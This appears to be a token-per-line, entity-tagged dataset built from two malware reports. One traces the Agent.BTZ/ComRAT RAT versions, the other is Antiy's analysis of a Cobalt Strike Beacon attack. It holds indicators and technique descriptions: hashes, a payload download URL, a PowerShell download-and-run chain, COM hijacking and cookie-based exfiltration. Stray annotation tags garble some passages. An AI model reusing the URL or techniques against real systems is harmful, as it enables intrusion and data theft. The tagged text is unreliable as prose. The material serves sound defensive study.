Ch
3.20
Fri
Jun
28
12:16:40
2013
UTC
83a48760e92bf30961b4a943d3095b0a B_hash
Ch
3.20
Fri
Jun
28
12:16:58
2013
UTC
3d65c18d09f47547f85c631ebeeda482 B_hash
Ch
3.20
Mon
Jun
24
10:51:01
2013
UTC
ec7e3cfaeaac0401316d66e964be684e B_hash
Ch
3.25
Thu
Feb
6
12:37:44
2014
UTC
b407b6e5b4046da226d6e189a67f62ca B_hash
Ch
3.26
Thu
Jan
3
18:03:46
2013
UTC

Thanks
to
the
versioning
,
we
can
deduce
that
the
compilation
dates
we
saw
and
currently
see
actually
seem
to
be
legit
–
except
for
the
last
known
version
,
in
which
the
author
modified
the
compilation
date
in
order
to
make
the
analysis
more
complex
.

We
can
see
that
this
malware
was
really
active
in
2007
and
2008
.

New
versions
declined
in
frequency
in
2009
and
only
one
new
sample
was
identified
in
2010
.

We
did
not
encounter
any
new
sample
from
2011
,
but
the
malware
appeared
back
in
2012
,
with
a
new
major
version
.

The
RAT's B_malware.backdoor
evolution
described
in
ten
steps

To
describe
the
evolution
of
the
development
,
we
decided
to
compare
ten
major
versions
:

Version
Ch
1.0
(
2007-06
)
to
Ch
1.5
(
2008-03
)

Version
Ch
1.5
(
2008-03
)
to
Ch
2.03
(
2008-05
)

Version
Ch
2.03
(
2008-05
)
to
Ch
2.11
(
2009-09
)

Version
Ch
2.11
(
2009-09
)
to
Ch
2.14.1
(
2010-02
)

Version
Ch
2.14.1
(
2010-02
)
to
Ch
3.00
(
2012-01
)

Version
Ch
3.00
(
2012-01
)
to
Ch
3.10
(
2012-12
)

Version
Ch
3.10
(
2012-12
)
to
Ch
3.20
(
2013-06
)

Version
Ch
3.20
(
2013-06
)
to
Ch
3.25
(
2014-02
)

Version
Ch
3.25
(
2014-02
)
to
Ch
3.26
(
2013-01
;
date
has
been
modified
)

The
following
chapter
will
present
the
main
differences
between
the
versions
mentioned
above
.

Here
is
the
resemblance
ratio
for
each
version
,
comparing
direct
neighbor
versions
only
,
created
using
BinDiff
:

The
biggest
code
update
has
occurred
between
version
2.14.1
and
version
3.00
.

The
gap
matches
the
absence
of
samples
during
two
years
and
this
fundamental
modification
is
what
we
call
the
death
of
Agent.BTZ B_malware.backdoor
and
the
birth
of
ComRAT B_malware.backdoor
.

Differences
between
version
Ch
1.0
(
2007-06
)
to
Ch
1.5
(
2008-03
)

The
analyzed
samples
are
:

Ch
1.0
:
b41fbdd02e4d54b4bc28eda99a8c1502 B_hash

Ch
1.5
:
bbf569176ec7ec611d8a000b50cdb754 B_hash

Code
similarity
:
90%

We
did
not
identify
strong
modification
between
the
two
samples
.

However
,
we
can
notice
the
following
:

The
configuration
file
(
XML
)
in
version
1.5
is
stored
in
Unicode
and
not
in
ASCII
anymore
;

The
two
versions
implement
a
mechanism
to
infect
new
media
connected
to
the
infected
system
.

The
implementation
is
not
exactly
the
same
nor
is
the
log
of
media
infection
;

Version
1.5
creates
a
new
event
:
'
wowmgr_is_load
'
.
This
event
has
then
been
used
for
years
.

Differences
between
version
Ch
1.5
(
2008-03
)
and
Ch
2.03
(
2008-05
)

The
analyzed
samples
are
:

Ch
1.5
:
bbf569176ec7ec611d8a000b50cdb754 B_hash

Ch
2.03
:
78d3f074b70788897ae7e20e5137bf47 B_hash

Code
similarity
:
83%

In
version
2.03
of
Agent.BTZ B_malware.backdoor
,
the
authors
changed
the
following
:

They
added
obfuscation
in
order
to
hide
sensitive
strings
;

The
communication
protocol
was
modified
in
order
to
include
the
flag
'
<CHCMD>
'
we
assume
that
'
CH
'
has
the
same
meaning
than
'
Ch
'
before
the
version
number
and
'
CMD
'
is
the
abbreviation
for
command
;

From
now
on
,
the
malware
supports
'
runas
'
in
order
to
execute
commands
as
administrator
.

This
command
was
implemented
by
Microsoft
in
Windows
Vista
in
2007
.

We
assume
that
the
author
implemented
this
feature
because
several
targets
switched
to
this
version
of
Windows
in
2008
.

According
to
an
article
,
version
1.5
was
used
against
the
US
Pentagon
.

We
assume
that
the
string
obfuscation
was
performed
in
order
to
bypass
security
measures
being
capable
of
detecting
an
intrusion
.

Differences
between
version
Ch
2.03
(
2008-05
)
and
Ch
2.11
(
2009-09
)

The
analyzed
samples
are
:

Ch
2.03
:
78d3f074b70788897ae7e20e5137bf47 B_hash

Ch
2.11
:
162f415abad9708aa61db8e03bcf2f3c B_hash

Code
similarity
:
96%

The
codes
of
these
two
versions
are
extremely
similar
to
each
other
,
we
can
only
notice
small
changes
:

The
author
changed
the
name
of
several
registry
keys
(
probably
to
avoid
detection
by
well-known
IOC
)
;

The
name
of
two
exported
functions
were
modified
,
too
:
InstallM
(
)
becomes
AddAtomT
(
)
and
InstallS
(
)
becomes
AddAtomS
(
)
,
probably
for
the
same
reason
than
above
.

Differences
between
version
Ch
2.11
(
2009-09
)
and
Ch
2.14.1
(
2010-02
)

The
analyzed
samples
are
:

Ch
2.11
:
162f415abad9708aa61db8e03bcf2f3c B_hash

Ch
2.14.1
:
5121ce1f96d74076df1c39748e019f42 B_hash

Code
similarity
:
98%

These
codes
are
really
similar
to
each
other
,
too
.

We
can
notice
only
two
changes
:

The
author
patched
several
bugs
;

Four
new
exports
appear
:
DllCanUnLoadNow
(
)
,
DllGetClassObject
(
)
,
DllRegisterServer
(
)
,

DllUnregisterServer
(
)
.

The
four
exported
libraries
show
that
the
malware
has
started
to
support
the
OLE
Component
Object
Model
(
COM
)
.

This
version
is
the
first
version
able
to
be
registered
as
a
COM
object
.

Three
of
the
four
functions
are
empty
.

The
fourth
one
executes
the
malware
.

Differences
between
version
2.14.1
(
2010-02
)
and
Ch
3.00
(
2012-01
)

The
analyzed
samples
are
:

Ch
2.14.1
:
5121ce1f96d74076df1c39748e019f42 B_hash

Ch
3.00
:
28dc1ca683d6a14d0d1794a68c477604 B_hash

Code
similarity
:
60%

These
codes
really
differ
from
each
other
,
even
if
some
parts
of
version
2.14.1
were
retained
.

Moreover
,
the
developers
changed
the
compiler
;

they
switched
from
Visual
Studio
6.0
to
Visual
Studio
9.0
/
10.0
,
which
is
a
strong
indicator
for
the
huge
differences
.

Version
3.00
is
what
the
G
DATA
SecurityLabs
experts
call
ComRAT B_malware.backdoor
.

We
can
say
that
version
2.14.1
is
the
last
version
of
Agent.BTZ B_malware.backdoor
.

Here
are
the
main
differences
between
Agent.BTZ B_malware.backdoor
and
ComRAT B_malware.backdoor
:

The
new
malware
collects
more
information
about
the
infected
system
(
such
as
drive
information
,
volume
information
...
)
.

The
media
stick
infection
mechanism
has
definitely
been
removed
.

We
assume
this
happened
due
to
the
fact
that
Microsoft
has
disabled
AutoRun
for
external
media
.

For
the
attackers
,
this
infection
vector
is
not
interesting
anymore
.

The
malware
is
injected
into
every
process
of
the
infected
machine
and
the
main
payload
is
executed
in
'
explorer.exe
'
as
we
explained
in
our
article
;

The
communication
channel
to
the
command
and
control
is
not
the
same
anymore
.

In
this
new
version
,
the
malware
uses
POST
requests
with
the
following
pattern
:

As
the
malware
is
injected
into
every
process
of
the
infected
system
,
it
creates
named
pipe
in
order
to
handle
inter-processes
communication
.

On
several
3.00
samples
,
the
author
forgot
to
remove
the
compilation
path
,
here
are
some
examples
:
c:\projects\ChinckSkx64\Debug\Chinch.pdb
c:\projects\ChinckSkx64\Release\libadcodec.pdb

C:\projects\ChinckSkx64\x64\Release\libadcodec.pdb

E:\old_comp\_Chinch\Chinch\trunk\Debug\Chinch.pdb
c:\projects\ChinchSk\Release\libadcodec.pdb

Thanks
to
these
compilation
paths
,
we
assume
that
the
original
name
of
the
RAT B_malware.backdoor
is
'
Chinch B_malware.backdoor
'
,
which
leads
us
to
the
assumption
that
the
'
CH
'
characters
in
the
version
name
and
in
the
flag
'
<CHCMD>
'
stands
for
'
Chinch
'
.

In
English
,
chinch
is
the
word
for
a
small
North
American
bug
,
Blissus
leucopterus
.

This
word
is
derived
from
the
Spanish
word
chinche
,
meaning
pest
.

Differences
between
version
3.00
(
2012-01
)
and
Ch
3.10
(
2012-12
)

The
analyzed
samples
are
:

Ch
3.00
:
28dc1ca683d6a14d0d1794a68c477604 B_hash

Ch
3.10
:
b86137fa5a232c614ec5405be4d13b37 B_hash

Code
similarity
:
90%

The
codes
are
similar
to
each
other
,
but
the
authors
added
several
features
:

The
malware
generates
more
logs
;

The
malware
has
a
Mutex
handle
;

The
3.10
version
supports
multiple
command
and
control
servers
.

The
last
new
feature
is
really
interesting
:
if
the
compromised
targets
block
a
specific
command
and
control
server
,
the
malware
will
continue
to
work
,
thanks
to
two
alternative
command
and
control
servers
.

Differences
between
version
3.10
(
2012-12
)
and
Ch
3.20
(
2013-06
)

The
analyzed
samples
are
:

Ch
3.10
:
b86137fa5a232c614ec5405be4d13b37 B_hash

Ch
3.20
:
7872c1d88fe21d8a85f160a6666c76e8 B_hash

Code
similarity
:
93%

The
major
new
feature
in
the
version
is
the
new
exports
function
called
InstallW
(
)
.

This
exported
function
is
used
by
the
dropper
to
add
persistence
in
the
registry
and
to
drop
a
second
file
(
as
explained
in
our
previous
article
)
.

Version
3.20
uses
the
following
CLSID
in
order
to
hijack
COM
object
:
B196B286-BAB4101A-B69C-00AA00341D07
.

This
object
is
the
IConnectionPoint
interface
.

The
CLSID
was
only
used
in
this
version
.

We
assume
that
the
performed
COM
object
hijacking
generates
some
trouble
on
the
infected
system
,
that's
why
the
author
changed
related
things
in
the
next
version
.

Furthermore
,
the
CLSID
was
stored
in
plain
text
within
the
sample
.

Differences
between
version
Ch
3.20
(
2013-06
)
and
Ch
3.25
(
2014-02
)

The
analyzed
samples
are
:

Ch
3.20
:
7872c1d88fe21d8a85f160a6666c76e8 B_hash

Ch
3.25
:
ec7e3cfaeaac0401316d66e964be684e B_hash

Code
similarity
:
91%

In
the
3.25
version
,
the
author
switched
to
the
CLSID
:
42aedc87-2188-41fd-b9a3-0c966feabec1
as
described
in
our
article
.

Furthermore
,
the
strings
in
the
sample
are
obfuscated
.

The
main
new
feature
is
the
obfuscation
–
almost
all
strings
are
obfuscated
and
the
XML
pattern
is
not
written
in
plain
text
anymore
.

Differences
between
version
Ch
3.25
(
2014-02
)
and
Ch
3.26
(
2013-01
;
date
has
been
modified
)

The
analyzed
samples
are
:

Ch
3.25
:
ec7e3cfaeaac0401316d66e964be684e B_hash

Ch
3.26
:
b407b6e5b4046da226d6e189a67f62ca B_hash

Code
similarity
:
95%

The
version
3.26
is
the
latest
known
version
.

In
this
version
:

The
authors
removed
the
familiar
XOR
key
used
by
Agent.BTZ B_malware.backdoor
and
Uroburos B_malware.backdoor
.

We
assume
that
due
to
the
G
DATA
publication
in
February
2014
,
the
author
decided
to
remove
as
many
links
as
possible
between
Uroburos B_malware.backdoor
and
Agent.BTZ B_malware.backdoor
/
ComRAT B_malware.backdoor
/
Chinch B_malware.backdoor
;

The
authors
do
not
generate
logs
anymore
;

The
compilation
date
has
been
modified
,
in
order
to
make
the
analysis
and
timeline
creation
more
complex
.

Conclusion

This
analysis
shows
us
seven
years
of
the
evolution
of
a
Remote
Administration
Tool
,
used
by
a
group
which
targeted
extremely
sensitive
entities
,
such
as
the
US
Pentagon
in
2008
or
the
Belgium
Ministry
of
Foreign
Affairs
in
2014
as
well
as
the
Finnish
Ministry
of
Foreign
Affairs
.

Except
for
version
3.00
,
the
modifications
made
are
rather
marginal
.

We
can
see
that
the
authors
adapted
features
to
the
Windows
versions
,
patched
bugs
,
added
obfuscation
etc
...
The
biggest
update
was
performed
to
version
3.00
,
after
two
years
of
silence
.

Visibly
,
this
RAT B_malware.backdoor
was
used
alongside
the
Uroburos B_malware.backdoor
rootkit I
.

Nevertheless
,
it
is
not
entirely
clear
how
and
when
the
attackers
choose
to
use
the
RAT B_malware.backdoor
or
the
rootkit B_malware.backdoor
or
whether
both
are
used
in
parallel
.

Taking
everything
into
consideration
,
G
DATA
SecurityLabs
experts
are
sure
that
the
group
behind
Uroburos
/
Agent.BTZ B_malware.backdoor
/
ComRAT B_malware.backdoor
/
Linux B_malware.backdoor
tool I
/
...
will
remain
an
active
player
in
the
malware
and
APT
field
.

The
newest
revelations
made
and
connections
drawn
let
us
believe
that
there
is
even
more
to
come
.
ANALYSIS
ON
APT-TO-BE
ATTACK
THAT
FOCUSING
ON
CHINA'S
GOVERNMENT
AGENCY

Antiy
CERT

First
release
time
:
14:32
,
May
27
,
2015

Updated
time
of
this
version
:
14:32
,
May
27
,
2015

Analysis
on
APT-to-be
Attack
That
Focusing
on
China's
Government
Agency

Contents

BACKGROUND
......................................................................................................................................................
1

ANALYSIS
ON
INCIDENT
SAMPLE
...........................................................................................................................
1

LEADING
FILES
AND
SAMPLE
DOWNLOADING
......................................................................................................
1

KEY
MECHANISM
.......................................................................................................................................................
3

ANALYSIS
ON
THE
MAJOR
SAMPLE
(
SAMPLE
B
)
OF
APT-TOCS  B_malware.infosteal
...........................................................................................
3

ANALYSIS
ON
SCRIPT
1
................................................................................................................................................
3

ANALYSIS
ON
MODULE
1
......................................................................................................................................
4

ANALYSIS
ON
MODULE
2
.............................................................................................................................................
5

ANALYSIS
ON
MODULE
3
.............................................................................................................................................
6

THE
AUTHENTICATION
ANALYSIS
ON
THE
TECHNOLOGY
SOURCES
OF
THIS
ATTACK
..............................................
7

COMPARISON
OF
MODULE
1
...............................................................................................................................
8

COMPARISON
OF
DISASSEMBLING
COMMANDS
OF
MODULE
2
...........................................................................
9

COMPARISON
ANALYSIS
ON
MODULE
3
DATA
PACKAGE
.....................................................................................
10

CHARACTERISTICS
OF
COBALT
STRIKE
................................................................................................................
11

CONCLUSION
.......................................................................................................................................................
11

APPENDIX
1
REFERENCES
OF
COBALT
STRIKE
AND
THE
AUTHOR
.................................................................................
12

APPENDIX
2
ABOUT
ANTIY
..........................................................................................................................................
16

1
Background

Recently
,
ANTIY
Labs
detected
an
APT
attack
targeting
some
government
agency
in
China
.
The
Shellcode
for
communication
is
conducted
depending
on
Beacon
mode
which
is
generated
on
the
basis
of
automatic
attack
detection
platform-Cobalt
Strike
.

This
kind
of
attack
pattern
disguising
as
non-malicious
real
file
in
the
host
of
its
target
,
it
sending
a
network
heartbeat
package
every
60
seconds
,
and
it
also
send
data
information
via
the
Cookie
field
,
all
these
features
of
this
attack
pattern
are
designed
to
evade
the
detection
of
security
software
and
the
interception
of
firewall
on
the
targeted
host
.

Considering
the
relationship
between
this
attack
and
Cobalt
Strike
platform
,
we
name
it
as
APT-TOCS  B_malware.infosteal
(
TOCS
refers
to
Threat
on
Cobalt
Strike
.
)
for
now
.

The
core
step
of
APT-TOCS  B_malware.infosteal
is
downloading
the
script
functionalities
of
Shellcode
,
which
downloads
a
field
of
data
into
memory
for
operation
by
calling
powershell.exe  B_malware.drop
.

The
decrypted
data
is
a
field
of
executable
Shellcode
that
is
generated
by
Cobalt
Strike
(
An
automatic
attack
testing
platform
)
.

After
loading
the
script
of
Shellcode
,
the
Analysis
Group
of
ANTIY
did
a
series
of
correlation
analysis
,
then
we
found
a
PE
program
that
maybe
act
as
a
guiding
executable
file
in
similar
attacks
.

The
loaded
Shellcode
script
can
be
used
to
call
command
line
to
add
a
certain
field
of
encrypted
date
into
memory
and
run
it
.

The
decrypted
date
turns
out
to
be
executable
Shellcode
which
is
generated
by
Cobalt
Strike
.

The
related
script
can
be
loaded
via
the
guiding
PE
program
or
vulnerability
.

This
kind
of
attack
pattern
has
several
features
which
including
running
in
memory
,
no
hard
disk
writing
operations
,
communicating
via
Beacon
,
multi-beacon
communication
is
acceptable
,
and
several
Beacons
can
work
simultaneously
.

Such
attack
can
be
launched
without
the
support
of
vector
file
,
in
fact
it
depends
on
network
projection
and
laterally
move
in
the
internal
network
as
required
conducting
an
attack
.
So
,
it
will
bring
great
difficulties
to
the
forensic
work
.

It
is
important
to
note
that
,
all
the
Sandboxes
we
know
are
disabling
to
fight
against
this
kind
of
attack
.

It
seems
that
the
attack
capability
of
APT-TOCS  B_malware.infosteal
is
close
to
that
of
APT-level
.

However
,
it
relied
on
automatic
attack
testing
platform
instead
of
abilities
of
the
attack
team
.

2
Analysis
on
incident
sample

2.1
Leading
files
and
sample
downloading

APT-TOCS  B_malware.infosteal
used
'
powershell.exe  B_malware.drop
'
to
execute
Shellcode
scripts
to
realize
remote
control
on
targeted
system
.

The
analysts
of
Antiy
thought
that
the
attacker
might
know
several
remote
injection
methods
of
script
downloading
privilege
,
such
as
directly
making
the
scrip
be
executed
on
the
host
by
using
security
vulnerabilities
.

Meanwhile
,
we
found
the
following
binary
leading
attack
files
(
hereinafter
referred
to
as
Sample
A
)
were
used
in
similar
attacks
before
:

Virus
name

Trojan/Win32.MSShell  B_malware.infosteal

Original
file
name
ab.exe  B_malware.drop
44BCF2DD262F12222ADEAB6F59B2975B  B_hash

Processor
structure

File
size
72.0
KB
(
73,802
bytes
)

File
format

Time
Stamp

BinExecute/Microsoft.EXE[:X86]
2009-05-10
07:02:12

Digital
signature

Shell
type

Unknown

Compilation
language
Microsoft
Visual
C++

The
functionality
code
of
the
scripts
embedded
in
this
PE
sample
is
completely
the
same
with
the
one
of
Shellcode
script
Antiy
has
acquired
,
while
the
encryption
data
of
them
differs
from
each
other
.
This
PE
sample
was
firstly
uploaded
to
Virustotal
on
May
2
,
2015
:

Figure
1
Downloading
encryption
data
using
powershell.exe
embedded
in
PE
files

The
PE
sample
used
WinExec
to
operate
embedded
malware
:

Figure
2
Using
function
WinExec
to
call
powershell.exe
to
download
leading
data

Therefore
,
we
can
see
that
the
'
leading
file
'
can
be
regarded
as
the
leading
part
of
attack
.

However
,
the
execution
and
control
still
can
be
made
depending
on
system
and
application
vulnerabilities
without
this
leading
file
.

According
to
above
information
,
we
cannot
make
sure
this
leading
sample
has
relationship
with
this
APT
incident
.

All
rights
reserved
.

2
.
2
Key
mechanism

The
core
part
of
APT-TOCS  B_malware.infosteal
relies
on
the
encrypted
data
scripts
(
hereinafter
referred
to
as
Sample
B
)
downloaded
by
PowerShell
.
Figure
1
consists
of
various
derivation
relationships
and
major
module
functionalities
:

Figure
3
Various
derivation
relationships
and
major
module
functionalities

2
.
3
Analysis
on
the
major
sample
(
Sample
B
)
of
APT-TOCS  B_malware.infosteal

The
content
(
Here
omitted
the
content
of
base64
.
)
of
Sample
B
is
as
follows
:

Figure
4
Content
of
Sample
B

The
functionality
of
this
part
of
script
is
:
decrypting
the
encrypted
content
of
base64
,
decompressing
with
Gzip
,
resulting
in
module
1
and
using
PowerShell
to
download
and
execute
.

2
.
4
Analysis
on
script
1

The
content
of
script
1
is
as
follows
:

Figure
5
Content
of
script
1

The
functionality
of
this
part
is
:
decrypting
data
with
base64
encryption
and
getting
module
1
,
then
writing
to
process
powershell.exe
,
and
executing
and
operating
.

2
.
5
Analysis
on
module
1

The
functionality
of
this
module
is
as
follows
:
calling
the
function
of
wininet
module
,
connecting
the
network
,
downloading
operations
of
module
2;
and
executing
by
downloading
to
the
memory
.

Figure
6
Request
of
HTTP
GET

Figure
6
shows
that
using
request
of
HTTP
GET
to
get
file
:
http://146.0.43.107/hfYn  B_url.distribute
.

2
.
6
Analysis
on
module
2

Module
2
established
and
listed
system
process
rundll32.exe
:

Figure
7
Establishing
and
listing
process
rundll32.exe

Data
that
has
been
written
into
module
3
:

Figure
8
Data
that
has
been
written
into
module
3

Though
the
data
of
module
3
started
with
'
MZ
'
,
it
does
not
belong
to
PE
files
.
Instead
,
it
is
the
Shellcode
with
backdoor
functionality
.

Figure
9
Shellcode
that
started
with
MZ(4D
5A
)

2
.
7
Analysis
on
module
3

The
module
might
connect
the
following
2
addresses
with
port
80
:

146.0.***.*** B_ip.unknown
(
Romania
)

dc.******69.info B_url.unknown
(
146.0.***.*** B_ip.unknown
)
(
Romania
)

Sending
request
data
and
receiving
return
data
.

Figure
10
Sending
request
data

The
decryption
to
above
IP
,
domains
and
accessing
addresses
is
'
XOR
0x69
'
.

Judging
from
the
module
strings
and
the
system
functions
,
the
module
belongs
to
backdoor
program
that
can
send
GET
request
to
designated
addresses
and
heartbeat
packages
by
using
Cookie
fields
with
60
seconds
'
interval
.
The
heartbeat
package
data
includes
:
check
code
,
process
ID
,
system
version
,
IP
address
,
computer
name
,
account
,
whether
it
is
64
bit
process
.
Then
it
transmits
by
making
use
of
both
RSA
and
BASE64
encryption
.

Figure
11
The
original
data
of
heartbeat
package

As
the
process
ID
and
check
code
are
different
,
the
transmitted
heartbeat
package
data
are
different
each
time
.
The
check
code
is
calculated
through
using
process
ID
and
the
millisecond
process
during
system
startup
.

The
algorithm
is
as
follows
:

Figure
12
Algorithm
of
check
code

The
encrypted
heartbeat
package
used
Cookie
field
to
transmit
:

Figure
13
Content
of
the
data
package

3
The
authentication
analysis
on
the
technology
sources
of
this
attack

The
leading
PE
files
,
Sample_A
and
Sample
B
,
associated
by
analysts
of
Antiy
CERT
used
the
exactly
same
method
of
PowerShell
.

However
,
we
cannot
eliminate
the
possibility
that
Sample_A
has
no
positive
connection
with
this
attack
due
to
the
high
standardization
of
relevant
scripts
.

We
still
consider
it
as
a
series
of
attack
incidents
based
on
other
comprehensive
analysis
.

The
attacker
might
exploit
the
following
ways
to
control
the
target
host
,
such
as
social
engineering
e-mails
,
file
bundling
,
exploiting
system
and
application
vulneratbilities
,
lateral
movement
of
intranet
and
so
on
.

We
found
'
Beacon
'
strings
when
analyzing
'
Module
1
'
.
According
to
existed
experience
,
we
doubted
that
Shellcode
is
closely
related
with
automatic
attack
testing
platform
Cobalt
Strike
.

Therefore
,
our
analysts
carried
out
comparison
analysis
on
Beacon
generated
by
Cobalt
Strike
,
and
authenticated
the
relationships
between
them
.

Cobalt
Strike
is
the
GUI
framework
penetration
tool
based
on
metasploit
.

The
business
version
of
it
integrates
the
following
characteristics
:
service B_ip.attack
scan  i
,
automatic  B_ip.attack
overflow  i
,
multi-mode   B_ip.attack
port  i
espionage i
,
various B_malware.unknown
Trojan  i
generation  i
,
phishing  B_malware.unknown
attack  i
,
site  B_ip.attack
clone i
,
target  B_ip.attack
information i
obtaining i
,
automatic B_ip.attack
browser i
attack  i
and
so
on
.

3
.
1
Comparison
of
Module
1

We
compared
module
1
and
the
payload
generated
by
using
Beacon
,
and
found
only
the
following
different
data
:
the
Head
data
,
request
file
name
and
IP
address
.

Figure
14
Comparison
of
Module
1

The
left
is
sample
module
1
,
while
the
right
is
the
module
generated
by
Beacon
.

We
can
lead
to
the
conclusion
from
the
comparison
:
module
1
is
generated
by
Beacon
.

The
screenshot
of
data
package
in
request
is
as
follows
:

Figure
15
The
data
package
comparison
of
module
1

3
.
2
Comparison
of
disassembling
commands
of
module
2

Our
analysts
compared
sample
module
2
and
relevant
files
of
Beacon
,
and
found
that
the
disassembling
commands
between
them
are
exactly
the
same
with
exception
of
functionality
code
,
including
XOR
encryption
at
the
entry
,
downloading
system
DLL
,
obtaining
function
address
,
function
calling
modes
and
so
on
.

The
following
lists
three
points
.

XOR
decry
ption
at
t
h
e
e
n
t
r
y
(
Using
x86
/shikata_g
a_nai
)

Sample
module
2

Relevant
Beacon
files

decrypted
code
the
entry

Function
calls

3
.
3
Comparison
analysis
on
module
3
data
package

The
following
figure
is
the
GET
request
comparison
of
the
module
generated
by
sample
module
3
and
Beacon
.

Here
we
can
see
both
of
them
use
Cookie
to
transmit
information
that
has
been
encrypted
,
and
send
requests
actively
every
60
seconds
.

The
data
package
is
heartbeat
.

Figure
16
Comparison
of
module
3
data
package

3
.
4
Characteristics
of
Cobalt
Strike

Using
Cobalt
Strike
attack
can
execute
various
operations
in
the
targeted
systems
,
such
as
downloading
and
uploading
files
,
executing
designated
programs
,
injecting
keyboard
recorder
,
executing
commands
via
PowerShell
,
importing
PowerShell
script
,
executing
commands
via
CMD
,
accessing
system
passwords
and
so
on
.

Cobalt
Strike
has
the
following
characteristics
:

Penetrating
sandbox

Avoiding
whitelist
mechanism
and
cloud
detection

Intranet
penetration

Persistent
attacks

Attacking
various
platforms

4
Conclusion

With
an
automated
test
platform
Cobalt
Strike
,
the
attack
penetration
can
penetrate
firewall
,
the
approach
the
attackers
used
to
control
targeted
host
is
covert
and
undetectable;
what's
more
,
it
can
attack
various
platforms
,
such
as
Windows
,
Linux
,
Mac
etc.;
it's
formidable
adversary
to
Trusted
Computing
,
Cloud
Detection
,
Sandbox
Detection
and
so
on
.

According
to
the
traces
in
the
past
,
we
believe
that
the
threat
has
been
active
for
5
years;
unfortunately
,
there
isn't
any
powerful
detection
production
and
methods
to
defeat
the
malicious
attack
till
now
.

The
reason
why
the
CERT
Analysis
Team
of
ANTIY
classified
APT-TOCS  B_malware.infosteal
into
APT
incidents
is
that
it's
a
kind
of
targeted
attack
(
one
of
the
features
of
APT
attack
)
,
it
has
anti-detection
functions
and
also
it
can
conceal
itself
.

Compared
with
APT
incidents
in
the
past
,
the
APT
attack
in
this
case
doesn't
cost
too
much
,
and
the
attackers
aren't
responsible
for
coding
.

With
the
application
of
commercial
attack
platform
,
the
attackers
saved
the
cost
of
an
attack
,
also
the
vulnerability
built
joint
function
provided
by
relevant
attack
platform
make
the
attackers
easy
to
do
injection
.

As
a
result
,
nations
and
organizations
which
without
its
own
elite
hacker
groups
and
abundant
capital
can
also
launch
some
kind
of
APT
attack
via
the
attack
pattern
mentioned
in
this
case
.

Meanwhile
,
it's
more
difficult
for
us
to
tracing
when
facing
such
modeled
attack
.

One
of
the
leaders
in
Information
Security
area-Bruce
Schiner
said
,
'
when
big
events
on
information
security
happened
,
people
tend
to
treat
it
as
an
example
of
cyber
warfare
.

It's
ridiculous
.

From
my
point
of
view
,
what's
happening
and
going
to
happen
is
:
more
and
more
tactics
in
physical
warfare
are
applied
to
cyber
warfare
.

It's
important
to
note
that
,
attack
capabilities
can
be
widely
distributed
if
attackers
take
full
advantages
of
certain
technology
,
especially
computer
technology
can
make
attack
more
powerful
and
automated
.

'
Obviously
,
highly
automated
commercial
platform
realized
a
high
speed
of
spread
of
this
attack
capability
(
exceeded
our
anticipation
)
.

We
have
to
remind
all
relevant
parties
that
we
are
confronting
with
the
risk
of
large
scale
diffusion
of
network
armaments
which
is
led
by
the
low
cost
of
the
attack
capability
.

The
commercial
penetration
attack
detecting
platform
has
two
sides
,
on
one
hand
,
it
can
check
the
network
environment
of
systems
effectively
,
on
the
other
hand
,
for
nations
,
organizations
and
industries
which
has
limited
budget
,
it
costs
too
much
.

Given
the
situation
,
all
related
parties
should
conduct
more
communication
with
each
other
,
additionally
,
there
is
no
doubt
that
both
offensive
party
and
defensive
party
are
supported
by
superpowers
,
these
superpowers
should
prevent
the
attack
technique
from
widely
distributing
.

The
incident
mentioned
there
has
no
difference
with
other
cases
we
detected
in
the
past
,
it
shows
that
,
on
the
way
to
realize
national
informatizaion
,
we
must
fight
against
serious
security
challenges
as
we
confronting
now;
it's
also
a
good
opportunity
for
our
Chinese
people
and
enterprises
to
demonstrate
our
faith
and
the
efforts
we
made
to
conquer
the
challenge
.

Appendix
1
References
of
Cobalt
Strike
and
the
author

Cobalt
Strike
is
the
business
version
of
Armitage
which
is
the
penetration
testing
software
of
Metasploit
figure
interface
written
by
Java
.

Armitage
can
carry
out
automatic
attacks
by
combining
with
known
exploits
of
Metasploit
.

It
integrates
the
free
version
of
Armitage
under
bt5
and
kali
linx
,
and
the
most
powerful
functionality
is
adding
the
Payload
of
Beacon
.

The
first
release
time
of
Cobalt
Strike
is
June
,
2012
.

Version

Description

Cobalt
Strike1
.

45
and
It
can
connect
the
metasploit
of
Windows
.

Then
it
must
connect
metasploit
of
Linux
.

former
versions

Cobalt
Strike1
.
46

System
analyzer
used
return
steps
to
check
on
Java
report
version
,
and
fixed
the
exploits
generated
by
private
key
.

Cobalt
Strike1
.
47

Relieved
multiple
Beacon
information
backlog;
had
a
overall
check
when
dictograph
was
on
.

Cobalt
Strike1
.
48

Adding
timestomp
command
to
Beacon;
the
waiting
time
of
copying
bypassuac
privilege
files

Cobalt
Strike1
.
49

Fixed
Beacon
HTTP
Stager
payload
generator
of
Windows
XP
.
lasted
10
seconds
.

Cobalt
Strike2
.
0

Cobalt
Strike2
.
1

Cobalt
Strike2
.
2

C&C
of
plasticity
,
adding
option
'
veil
'
to
the
payload
generator
.

PowerShell
command
started
major
local
PowerShell;
updated
build.sh
tool
.

Reconstructed
the
VNC
server
of
process
injecting
and
connecting
with
targeted
system
.
The
new
process
is
easier
to
be
neglected
due
to
the
host
firewall
.
The
exploit
report
showed
URL
quotes
from
ZDI
,
MSB
,
US-CERT-VU
and
WPVDB
.

Cobalt
Strike2
.
3

Compiled
the
DNS
field
of
Beacon
with
customized
encoder
.
Beacon
added
command
runas
and
pwd
.

Cobalt
Strike2
.
4

Adding
time
stamp
to
view
-
>web
log;
regenerating
new
default
Beacon
HTTPS
certification
with
different
parameters;
then
generating
C2
HTTPS
certification;
updating
executable
files
and
default
tool
kit
of
DLLS
.

Author
of
Cobalt
Strike
:
Raphael
Mudge

Raphael
Mudge
is
the
founder
of
Strategic
Cyber
LLC
,
a
Washington
,
DC
based
company
that
creates
software
for
red
teams
.
He
created
Armitage
for
Metasploit
,
the
Sleep
programming
language
,
and
the
IRC
client
jIRCii
.

Previously
,
Raphael
worked
as
a
security
researcher
for
the
US
Air
Force
,
a
penetration
tester
,
and
he
even
invented
a
grammar
checker
that
was
sold
to
Automattic
.
His
work
has
appeared
in
Hakin9
,
USENIX
;login
:
,
Dr
.
Dobb's

Journal
,
on
the
cover
of
the
Linux
Journal
,
and
the
Fox
sitcom
Breaking
In
.
Raphael
regularly
speaks
on
security
topics
and
provides
red
team
support
to
many
cyber
defense
competitions
.

Education
background
:
Syracuse
University
,
Michigan
Technological
University

Current
position
:
Strategic
Cyber
LLC
,
Delaware
Air
National
Guard

Skills
:
software
development
,
information
security
,
object-oriented
design
,
distributed
system
,
figure
interface
,
computer
network
design
,
blog
system
,
social
